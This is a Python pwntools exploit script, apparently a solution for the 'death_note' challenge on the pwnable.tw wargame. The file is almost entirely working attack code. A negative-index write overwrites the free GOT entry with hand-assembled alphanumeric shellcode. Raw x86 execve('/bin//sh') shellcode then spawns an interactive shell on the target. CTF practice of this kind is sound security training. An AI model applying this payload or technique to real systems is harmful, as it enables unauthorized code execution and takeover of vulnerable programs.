#!/usr/bin/env python
# encoding: utf-8

from pwn import *
import sys

#context.log_level = "debug"
BIN_FILE = "death_note"
LIBC_FILE = "libc_32.so.6"


def Add(Index,name):
    p.recvuntil("choice :")
    p.sendline("1")
    p.recvuntil("Index :")
    p.sendline(str(Index))
    p.recvuntil("Name :")
    p.sendline(name)

def Show(Index):
    p.recvuntil("choice :")
    p.sendline("2")
    p.recvuntil("Index :")
    p.sendline(Index)

def Delete(Index):
    p.recvuntil("choice :")
    p.sendline("3")
    p.recvuntil("Index :")
    p.sendline(Index)

def Exit():
    p.recvuntil("choice :")
    p.sendline("4")

if __name__ == "__main__":
    if len(sys.argv)==1:  # local
        p = process(BIN_FILE)
    else:
        p = remote('chall.pwnable.tw', 10201)
    #gdb.attach(proc.pidof(p)[0],"b *0x8048873\nb *0x80487cc\n")
    #+==================INIT=====================================
    libc = ELF(LIBC_FILE)
    elf = ELF(BIN_FILE)
    free_got = elf.got['free']
    name_addr = 0x0804A060
    #+==================INIT=====================================
    buf = ''
    buf += asm('pop ecx') # ecx = 0x8048878
    buf += asm('pop eax') # eax = heap addr
    buf += asm('push 0x6e')
    buf += asm('pop ebx')
    buf += asm('sub byte ptr[eax+0x33], bl')

    buf += asm('push 0x50') #read_num
    buf += asm('push esp')
    buf += asm('pop eax')
    buf += asm('push eax') #read into stack
    buf += asm('push eax') #ret_addr
    buf += asm('push ecx') #call read_input

    #make ecx = read_input 0x804862b
    buf += asm('push esp') # stack addr
    buf += asm('pop eax') # eax = stack addr
    buf += asm ('push 0x30303033')
    buf += asm('pop esi')
    buf += asm ('xor word ptr[eax], si')
    buf += asm ('push 0x30303220')
    buf += asm('pop esi')
    buf += asm('sub word ptr[eax], si')
    buf += "11111111"
    Add(1,"mutepig")
    Add((free_got - name_addr)/4,buf)
    Delete("1")

    shellcode = "\x31\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    p.sendline(shellcode)

    p.interactive()


